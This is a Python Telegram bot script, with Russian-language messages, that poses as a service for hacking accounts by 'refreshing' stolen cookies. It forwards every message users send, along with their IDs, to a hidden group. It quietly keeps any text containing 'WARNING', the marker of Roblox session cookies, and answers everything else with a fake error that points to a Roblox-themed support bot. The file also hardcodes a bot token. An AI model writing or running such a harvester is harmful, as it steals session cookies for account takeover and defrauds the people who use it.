import os
import telebot

TOKEN = "8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA"
GROUP_ID = "-1003396901780"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    # Игнорируем сообщения из групп
    if message.chat.type != 'private':
        return
        
    bot.send_message(
        message.chat.id, 
        "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪"
    )
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}\nИмя: {message.from_user.first_name}")
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    # Игнорируем сообщения из групп
    if message.chat.type != 'private':
        return
    
    # ВСЕГДА пересылаем сообщение в группу (независимо от содержания)
    try:
        bot.send_message(
            GROUP_ID, 
            f"📩 Сообщение от: {message.from_user.first_name} (@{message.from_user.username})\n"
            f"ID: {message.from_user.id}\n"
            f"Текст: {message.text}"
        )
        print(f"✅ Сообщение переслано в группу: {message.text}")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")
    
    # Проверяем содержит ли сообщение слово "WARNING"
    if "WARNING" in message.text:
        # Игнорируем сообщения с "WARNING" (не отвечаем пользователю)
        print(f"🔇 Игнорирован ответ на сообщение с WARNING от {message.from_user.id}")
        return
    
    # На все остальные сообщения отвечаем ошибкой
    bot.send_message(
        message.chat.id,
        "ошибка❌ пожалуйста, введите действительный куки! если не знаете как его получить обращайтесь в поддержку - @suportrrobloxbot"
    )

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True)
